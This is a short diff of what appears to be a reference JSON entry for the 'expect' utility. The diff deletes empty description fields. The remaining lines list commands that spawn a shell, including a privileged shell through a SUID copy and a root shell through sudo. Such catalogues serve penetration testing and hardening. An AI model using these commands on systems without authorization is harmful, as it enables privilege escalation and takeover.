@@ -8,19 +8,19 @@
     ],
     "shell": [
       {
-        "description": "",
+        
         "code": "expect -c 'spawn /bin/sh;interact'\n"
       }
     ],
     "suid": [
       {
-        "description": "",
+        
         "code": "./expect -c 'spawn /bin/sh -p;interact'\n"
       }
     ],
     "sudo": [
       {
-        "description": "",
+        
         "code": "sudo expect -c 'spawn /bin/sh;interact'\n"
       }
     ]
